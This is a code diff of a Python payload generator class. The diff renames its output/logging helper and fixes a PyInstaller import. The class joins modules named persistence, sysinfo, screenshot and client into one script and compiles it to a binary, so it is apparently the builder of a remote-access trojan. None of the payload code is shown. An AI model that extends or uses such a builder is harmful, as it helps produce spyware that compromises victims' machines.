@@ -4,9 +4,8 @@ import shutil
 import sys
 import threading
 import time
-import PyInstaller
-from main.common.output import pull
-
+import PyInstaller.__main__
+from common.output import output
 
 class GENERATOR:
 
@@ -44,7 +43,7 @@ class GENERATOR:
             elif platform.system() == "Linux":
                 rtval = (out)
             else:
-                pull.exit("Unrecognized Platform")
+                output.exit("Unrecognized Platform")
 
         return rtval
 
@@ -54,7 +53,7 @@ class GENERATOR:
         if os.path.isdir(dirname):
             return dirname
         else:
-            pull.exit("Files missing to generate the payload!")
+            output.exit("Files missing to generate the payload!")
 
     def get_imports(self):
         topen = os.path.join(self.pather, 'imports.py')
@@ -115,33 +114,33 @@ class GENERATOR:
 
     def patch(self):
         time.sleep(2)
-        pull.function("Compiling modules ... ")
+        output.function("Compiling modules ... ")
         self.data = self.v_imports + "\n\n" + self.v_consts + "\n" + self.v_persistence + "\n" + self.v_sysinfo + "\n\n" + \
                 self.v_screenshot + "\n\n" + self.v_client + "\n\n" + self.v_main
         time.sleep(2)
-        pull.function("Generating source code ...")
+        output.function("Generating source code ...")
         fl = open(self.output, 'w')
         fl.write(self.data)
         fl.close()
         time.sleep(2)
-        pull.print("Code generated successfully!")
-        pull.print("File: " + self.output)
+        output.success("Code generated successfully!")
+        output.success("File: " + self.output)
 
     def generate(self):
         time.sleep(2)
-        pull.function("Compiling modules ... ")
+        output.function("Compiling modules ... ")
         self.data = self.v_imports + "\n\n" + self.v_consts + "\n\n" + self.v_persistence + "\n\n" + self.v_sysinfo + "\n\n" + \
                 self.v_screenshot + "\n\n" + self.v_client + "\n\n" + self.v_main
         time.sleep(2)
-        pull.function("Generating one time code for binary ")
+        output.function("Generating one time code for binary ")
         self.flname = self.tmp_dir()
         fl = open(self.flname[1], 'w')
         fl.write(self.data)
         fl.close()
-        pull.print("Code generated successfully!")
+        output.success("Code generated successfully!")
 
     def compile(self):
-        pull.function("Compiling generated code /\\")
+        output.function("Compiling generated code /\\")
         counter = 1
 
         t = threading.Thread(target=PyInstaller.__main__.run, args=([
@@ -157,14 +156,14 @@ class GENERATOR:
         t.start()
 
         while t.is_alive():
-            sys.stdout.write("\r" + pull.BLUE + "[" + pull.UNDERLINE + ":" + pull.END + pull.BLUE + "] " + pull.END + "Elapsed Time: %is" % (counter) + pull.END)
+            sys.stdout.write("\r" + output.BLUE + "[" + output.UNDERLINE + ":" + output.END + output.BLUE + "] " + output.END + "Elapsed Time: %is" % (counter) + output.END)
             time.sleep(1)
             counter += 1
 
         sys.stdout.write("\n")
-        pull.print("Compiled Successfully!")
+        output.success("Compiled Successfully!")
 
     def clean(self):
-        pull.function("Cleaning files and temporary codes")
+        output.function("Cleaning files and temporary codes")
         shutil.rmtree(self.flname[0])
-        pull.print("File: " + self.output)
+        output.success("File: " + self.output)
